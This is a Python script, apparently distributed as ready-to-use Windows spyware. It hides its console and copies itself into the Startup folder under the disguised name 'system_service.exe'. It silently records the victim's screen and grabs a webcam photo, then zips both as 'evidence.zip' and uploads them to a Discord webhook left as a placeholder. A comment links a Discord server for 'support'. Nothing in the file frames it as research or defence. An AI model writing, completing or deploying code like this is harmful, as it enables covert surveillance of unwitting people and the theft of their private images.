import os
import sys
import subprocess
import tempfile
import shutil
import threading
import time
import zipfile
import io
import requests


IS_BUNDLED = getattr(sys, 'frozen', False)


if not IS_BUNDLED:
    def install_dependencies():
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "opencv-python", "pyautogui", "pillow", "numpy"], 
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

    
    install_dependencies()


try:
    import cv2
    import pyautogui
    from PIL import ImageGrab
    import numpy as np
    DEPENDENCIES_INSTALLED = True
except ImportError:
    DEPENDENCIES_INSTALLED = False

# Ocultar consola
def hide_console():
    if os.name == 'nt':
        import ctypes
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd != 0:
            ctypes.windll.user32.ShowWindow(whnd, 6)  # 6 = SW_MINIMIZE


def add_to_startup():
    try:
        
        if IS_BUNDLED:
            current_file = sys.executable
        else:
            current_file = os.path.realpath(sys.argv[0])
        
        
        startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        
        
        startup_file = os.path.join(startup_folder, "system_service.exe")
        
        
        if not os.path.exists(startup_file):
            shutil.copy(current_file, startup_file)
    except:
        pass


def record_screen(duration=15):
    if not DEPENDENCIES_INSTALLED:
        return None
        
    try:
        
        screen_width, screen_height = pyautogui.size()

        temp_dir = tempfile.mkdtemp()
        video_path = os.path.join(temp_dir, "screen_record.mp4")

        
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(video_path, fourcc, 20.0, (screen_width, screen_height))
        
        
        if not out.isOpened():
            return None

        
        start_time = time.time()
        while time.time() - start_time < duration:
            # Capturar pantalla
            img = ImageGrab.grab()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            # frame
            out.write(frame)

        out.release()
        
        
        if os.path.exists(video_path) and os.path.getsize(video_path) > 0:
            return video_path
        else:
            return None
    except:
        return None


def capture_photo():
    if not DEPENDENCIES_INSTALLED:
        return None
        
    try:
        temp_dir = tempfile.mkdtemp()
        photo_path = os.path.join(temp_dir, "camera_photo.jpg")

        
        cap = cv2.VideoCapture(0)
        
        
        if not cap.isOpened():
            cap.release()
            return None
            
        
        time.sleep(1)
        
        ret, frame = cap.read()
        
        if ret:
            
            cv2.imwrite(photo_path, frame)
            
        cap.release()
        cv2.destroyAllWindows()
        
        
        if os.path.exists(photo_path) and os.path.getsize(photo_path) > 0:
            return photo_path
        else:
            return None
    except:
        return None


def send_to_discord(webhook_url, video_path, photo_path):
    try:
        
        video_exists = video_path and os.path.exists(video_path) and os.path.getsize(video_path) > 0
        photo_exists = photo_path and os.path.exists(photo_path) and os.path.getsize(photo_path) > 0
        
        
        if not video_exists and not photo_exists:
            return False
            
        
        zip_buffer = io.BytesIO()

        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            
            if video_exists:
                with open(video_path, 'rb') as file:
                    zip_file.writestr("screen_record.mp4", file.read())
            
            
            if photo_exists:
                with open(photo_path, 'rb') as file:
                    zip_file.writestr("camera_photo.jpg", file.read())
        
        zip_buffer.seek(0)

        
        files = {
            'file': ('evidence.zip', zip_buffer, 'application/zip')
        }
        
        response = requests.post(webhook_url, files=files)
        return response.status_code == 200
    except:
        return False


def main():
    hide_console()
    
    
    add_to_startup()
    
    
    webhook_url = "WEBHOOK HERE"
    
    try:
        
        video_path = record_screen(15)
        
        
        photo_path = capture_photo()
        
        
        send_to_discord(webhook_url, video_path, photo_path)
        
        
        if video_path and os.path.exists(os.path.dirname(video_path)):
            shutil.rmtree(os.path.dirname(video_path))
        
        if photo_path and os.path.exists(os.path.dirname(photo_path)):
            shutil.rmtree(os.path.dirname(photo_path))
            
    except Exception as e:
        
        pass


if __name__ == "__main__":
    # Si lees esto eres GAY
    thread = threading.Thread(target=main)
    thread.start()
    thread.join()  # Support in Discord https://discord.gg/G3EW6Kreba